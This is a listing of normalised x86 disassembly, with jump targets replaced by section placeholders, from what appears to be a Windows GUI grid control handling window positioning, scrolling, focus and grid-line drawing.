push 0x0
mov eax ebx
call sub_448d84
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_448d84
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_448d84
push eax
mov eax ebx
call sub_448d84
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_448d84
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_448d84
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_46af5c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_46aed8
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_403540
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_448d84
push eax
call SetFocus
sub_46afc4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_46af5c
jmp r-xdata
mov al 0x1
mov eax edi
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_403540
test al al
je r-xdata
mov eax edi
call sub_46aed8
xor eax eax
jmp r-xdata
mov eax edi
call sub_448d84
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_46aed8
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_448d84
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_46b074
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_412f04
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_448d84
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_448d84
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_46b0dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46b188
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4671c4
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_403540
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4674b8
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_403540
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4671c4
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_403540
mov edx eax
mov eax ebx
call sub_46758c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b18f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_46b198
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44aa4c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_4426f0
xor edx edx
mov eax ebx
call sub_442714
mov dl 0x1
mov eax ebx
call sub_448fb8
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_46d718
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_46b2e8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44aaa8
mov eax [ esi + 0x220 ]
call sub_402714
mov eax [ esi + 0x250 ]
call sub_402714
mov eax [ esi + 0x224 ]
call sub_402714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_46b33c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46b448
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x10 ]
call sub_46a354
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_46a660
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b44f
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_46b45c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_46b33c
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_46b33c
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_46d628
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_403540
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_448d84
push eax
call ScrollWindow
mov eax ebx
call sub_448d84
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_46de6c
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_46b5c0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_46d628
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_46b610
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b5c0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46b644
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_46b6a0
test al al
jne r-xdata
sub_46b6a0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_45a2f0
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_46b740
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_46b730
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_448d84
push eax
call PostMessageA
sub_46b794
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_418240
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418248
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_418190
mov ecx eax
mov edx esi
mov eax edi
call sub_46f994
inc esi
dec ebx
jne r-xdata
sub_46b7d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_418240
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418248
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_418190
mov ecx eax
mov edx esi
mov eax edi
call sub_46fd04
inc esi
dec ebx
jne r-xdata
sub_46b814
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_419a8c
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_419a94
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46f874
mov edx eax
mov eax ebp
call sub_419a18
inc esi
dec ebx
jne r-xdata
sub_46b854
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_419a8c
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_419a94
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46f894
mov edx eax
mov eax ebp
call sub_419a18
inc esi
dec ebx
jne r-xdata
sub_46b894
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_46a7c4
xor al 0x1
pop ebx
pop ebp
retn
sub_46b8d8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_46a7c4
xor al 0x1
pop ebx
pop ebp
retn
sub_46b91c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4460c4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_46b794
mov eax [ ebp - 0x8 ]
push eax
push sub_46b814
push ebp
call sub_46b894
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_46b7d4
mov eax [ ebp - 0x8 ]
push eax
push sub_46b854
push ebp
call sub_46b8d8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_46b9c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_46ddb0
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_46ddb0
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_46ddb0
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_46f904
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_46a76c
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_46a76c
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_46fea0
mov eax ebx
mov si 0xffa5
call sub_403540
mov edx esp
mov eax ebx
call sub_46d7a4
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_403540
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_46ba98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_46ddb0
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_46ddb0
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_46ddb0
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_403540
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_46a76c
mov eax ebx
call sub_46fea0
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_403540
sub_46bb28
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_46c800
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_46bb80
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_46b610
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_46b0cc
sub_46bbcc
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_46bc14
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_41d7ec
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41d6c0
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_41d6c0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_41d6b8
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_41d7e4
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41d780
mov eax [ esi + 0x10 ]
call sub_41d7e4
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_46bdfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_46bc14
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_46bc14
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_46bc14
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_46bc14
pop ecx
jmp r-xdata
sub_46be8c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_46f894
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_46f874
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_46b6a0
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_46a3d4
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_41e130
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_41d9c8
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
